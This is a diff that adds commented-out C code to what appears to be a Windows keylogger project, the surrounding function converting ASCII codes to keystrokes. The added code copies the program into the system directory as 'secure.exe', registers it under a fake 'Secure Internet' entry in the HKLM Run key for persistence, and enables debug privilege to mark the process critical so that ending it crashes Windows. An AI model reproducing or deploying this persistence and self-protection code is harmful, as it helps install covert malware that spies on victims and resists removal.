@@ -87,3 +87,71 @@ char convertAscii(int codAscii){
 	}
 	return tecla;
 }
+
+// #define FAKE_NAME "\\secure.exe"
+// #define FAKE_KEY "Secure Internet"
+
+// void regApp () {
+//     char system_ [MAX_PATH];
+//     char pathToFile[MAX_PATH];
+//     HMODULE getMod = GetModuleHandle (NULL);
+    
+//     GetModuleFileName (getMod, pathToFile, sizeof(pathToFile));
+//     GetSystemDirectory (system_, sizeof( system_ ));
+    
+//     strcat (system_, FAKE_NAME);
+    
+//     CopyFile (pathToFile, system_, 0);
+    
+//     HKEY key_;
+//     RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &key_);
+//     RegSetValueEx(key_, FAKE_KEY, 0, REG_SZ, (const unsigned char *) system_, sizeof(system_));
+//     RegCloseKey(key_);
+// }
+ 
+// int protectProcess() {
+//     int enablePriv (const char * szPriv);
+//     HANDLE DLL;
+//     RtlSetProcessIsCritical setCritical;
+ 
+//     DLL = LoadLibraryA ("ntdll.dll");
+ 
+//     if(DLL == NULL)
+// 		return -1;
+ 
+// 	if (enablePriv(SE_DEBUG_NAME) < 0)
+// 		return -1;
+ 
+// 	setCritical = (RtlSetProcessIsCritical) GetProcAddress((HINSTANCE) DLL, "RtlSetProcessIsCritical");
+// 	if (!setCritical)
+// 		return -1;
+// 	setCritical(1, 0, 0);
+
+// 	return 0;
+// }
+ 
+// int enablePriv (const char * szPriv) {
+//     HANDLE token;
+//     LUID luid;
+//     TOKEN_PRIVILEGES privs;
+//     memset (&privs, 0, sizeof (privs));
+
+//     if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token)) 
+//         return -1;
+
+
+//     if (!LookupPrivilegeValue(NULL, szPriv, &luid)){
+//         CloseHandle (token);
+//         return -1;
+//     }
+
+//     privs.PrivilegeCount = 1;
+//     privs.Privileges[0].Luid= luid;
+//     privs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+
+//     if (!AdjustTokenPrivileges (token, FALSE, &privs, sizeof (privs),NULL,NULL)) 
+//         return -1;
+
+//     CloseHandle (token);
+//     return 0;
+// }
